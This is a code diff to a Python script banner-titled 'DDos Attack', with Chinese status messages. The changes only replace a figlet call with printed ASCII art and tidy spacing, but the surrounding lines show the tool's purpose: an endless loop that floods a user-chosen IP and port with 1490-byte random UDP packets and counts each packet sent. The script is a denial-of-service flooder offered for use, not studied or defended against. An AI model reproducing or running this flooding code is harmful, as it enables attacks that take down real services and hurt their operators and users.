@@ -15,15 +15,20 @@ bytes = random._urandom(1490)
 if sys.version[0] == "2":
     input = raw_input
 
+
 def clear():
     if os.name == "nt":
         os.system("cls")
     else:
         os.system("clear")
 
-clear()
-os.system("figlet DDos Attack")
 
+clear()
+print(" ____  ____                 _   _   _             _     ")
+print("|  _ \|  _ \  ___  ___     / \ | |_| |_ __ _  ___| | __ ")
+print("| | | | | | |/ _ \/ __|   / _ \| __| __/ _` |/ __| |/ / ")
+print("| |_| | |_| | (_) \__ \  / ___ \ |_| || (_| | (__|   <  ")
+print("|____/|____/ \___/|___/ /_/   \_\__|\__\__,_|\___|_|\_\\")
 print (" ")
 print ("/---------------------------------------------------\ ")
 print ("|   作者          : Andysun06                       |")
@@ -44,6 +49,5 @@ sent = 0
 while True:
     sock.sendto(bytes, (ip, port))
     sent = sent + 1
-    print ("已发送 %s 个数据包到 %s 端口 %d"%(sent, ip, port))
-    time.sleep((1000-sd)/2000)
-
+    print ("已发送 %s 个数据包到 %s 端口 %d" % (sent, ip, port))
+    time.sleep((1000 - sd) / 2000)
